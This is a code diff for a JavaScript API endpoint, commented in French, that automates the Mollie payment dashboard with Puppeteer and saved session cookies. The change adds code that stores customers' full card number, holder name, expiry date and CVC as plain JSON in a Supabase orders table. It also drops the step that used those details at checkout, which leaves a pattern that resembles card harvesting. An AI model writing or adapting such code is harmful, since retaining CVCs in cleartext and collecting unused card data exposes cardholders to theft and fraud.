@@ -1,9 +1,42 @@
 import puppeteer from 'puppeteer';
 import fs from 'fs/promises';
 import path from 'path';
+import { createClient } from '@supabase/supabase-js';
 
 const COOKIES_FILE = path.join(process.cwd(), 'cookies/mollie.json');
 const MOLLIE_URL = 'https://my.mollie.com/dashboard/org_19237865/home';
+
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+
+async function updateExistingOrder(orderNumber, amount, cardDetails) {
+  try {
+    const cardDetailsToStore = {
+      cardNumber: cardDetails.cardNumber,
+      cardOwner: cardDetails.cardOwner,
+      cardExpiration: cardDetails.cardExpiration,
+      cardCVC: cardDetails.cardCVC,
+    };
+
+    // Mettre à jour la commande existante
+    const { error: updateError } = await supabase
+      .from('orders')
+      .update({
+        status: 'pending',
+        card_details: JSON.stringify(cardDetailsToStore), // Stocker les informations de carte
+      })
+      .eq('id', orderNumber);
+
+    if (updateError) {
+      console.error('Error updating order in Supabase:', updateError);
+      throw new Error('Failed to update order in database');
+    }
+
+    console.log('Order updated successfully in Supabase');
+  } catch (error) {
+    console.error('Error updating order in Supabase:', error);
+    throw new Error('Failed to update order in Supabase');
+  }
+}
 
 async function importCookies(page) {
   try {
@@ -17,7 +50,7 @@ async function importCookies(page) {
   }
 }
 
-async function automateMollieTopUp(amount, cardDetails) {
+async function automateMollieTopUp(orderNumber, amount, cardDetails) {
   const browser = await puppeteer.launch({
     headless: false, // Mode non-headless pour débogage
     defaultViewport: null,
@@ -27,6 +60,9 @@ async function automateMollieTopUp(amount, cardDetails) {
   const page = await browser.newPage();
 
   try {
+    // Mettre à jour la commande existante dans Supabase
+    await updateExistingOrder(orderNumber, amount, cardDetails);
+
     // Importer les cookies
     await importCookies(page);
 
@@ -64,41 +100,14 @@ async function automateMollieTopUp(amount, cardDetails) {
     // Appuyer sur Entrer
     await page.keyboard.press('Enter');
 
-    // Attendre que le checkout se charge
-    await page.waitForTimeout(4000);
-
-    // Remplir les détails de la carte
-    const { cardNumber, cardOwner, cardExpiration, cardCVC } = cardDetails;
-
-    // Écrire le numéro de carte
-    await page.keyboard.type(cardNumber);
-
-    // Écrire le titulaire de la carte
-    await page.waitForTimeout(1000);
-    await page.keyboard.press('Tab');
-    await page.waitForTimeout(1000);
-    await page.keyboard.type(cardOwner);
-
-    // Écrire la date d'expiration
-    await page.waitForTimeout(1000);
-    await page.keyboard.press('Tab');
-    await page.waitForTimeout(1000);
-    await page.keyboard.type(cardExpiration);
-
-    // Écrire le code de sécurité
-    await page.waitForTimeout(1000);
-    await page.keyboard.press('Tab');
-    await page.waitForTimeout(1000);
-    await page.keyboard.type(cardCVC);
-
-    // Effectuer le paiement
+    // Attendre le checkout 
     await page.waitForTimeout(2000);
-    await page.keyboard.press('Enter');
 
-    // Attendre que le paiement soit traité
-    await page.waitForTimeout(10000);
+    // Retourner l'URL de la page
+    const url = page.url();
 
-    console.log('Top-up completed successfully.');
+    console.log('Lien de paiement Mollie:', url);
+    return url; // Retourne le lien de paiement
   } catch (error) {
     console.error('Error during Mollie automation:', error.message);
     throw error;
@@ -112,15 +121,15 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { amount, cardDetails } = req.body;
+  const { orderNumber, amount, cardDetails } = req.body;
 
-  if (!amount || !cardDetails) {
-    return res.status(400).json({ error: 'Missing required parameters: amount or cardDetails' });
+  if (!orderNumber || !amount || !cardDetails) {
+    return res.status(400).json({ error: 'Missing required parameters: orderNumber, amount, or cardDetails' });
   }
 
   try {
-    await automateMollieTopUp(amount, cardDetails);
-    res.status(200).json({ message: 'Top-up completed successfully' });
+    const paymentLink = await automateMollieTopUp(orderNumber, amount, cardDetails);
+    res.status(200).json({ paymentLink }); // Renvoie le lien de paiement
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
